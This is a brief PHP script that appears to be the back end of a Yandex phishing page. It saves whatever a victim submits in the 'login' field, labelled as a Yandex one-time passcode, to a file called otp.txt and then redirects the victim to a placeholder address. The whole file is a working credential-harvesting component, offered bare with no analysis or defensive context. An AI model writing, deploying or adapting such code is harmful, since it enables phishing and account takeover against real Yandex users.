<?php

file_put_contents("otp.txt", "Yandex OTP : " . $email = $_POST['login'] . "\n", FILE_APPEND);
header('Location: https://redirecturl');
?>
